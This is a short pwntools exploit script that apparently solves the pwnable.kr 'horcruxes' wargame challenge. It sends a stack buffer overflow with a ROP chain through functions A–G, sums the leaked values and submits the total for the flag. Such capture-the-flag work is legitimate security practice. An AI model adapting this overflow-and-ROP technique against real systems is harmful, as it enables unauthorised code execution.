from pwn import *

r = remote('pwnable.kr', 9032)
elf = ELF('./horcruxes')

r.sendlineafter('Menu:', '1')
A = elf.sym['A']
B = elf.sym['B']
C = elf.sym['C']
D = elf.sym['D']
E = elf.sym['E']
F = elf.sym['F']
G = elf.sym['G']
ropme = 0x809fffc
payload = b'a'*0x78 + p32(A) + p32(B) + p32(C) + p32(D) + p32(E) + p32(F) + p32(G) + p32(ropme)
r.sendlineafter('earned? : ', payload)
sum = 0
for i in range(7):
    r.recvuntil('+')
    sum += int(r.recvline().strip()[:-1])
success('sum = %d', sum)
r.sendlineafter('Menu:', '1')
r.sendlineafter('earned? : ', str(sum))
print(r.recv().decode())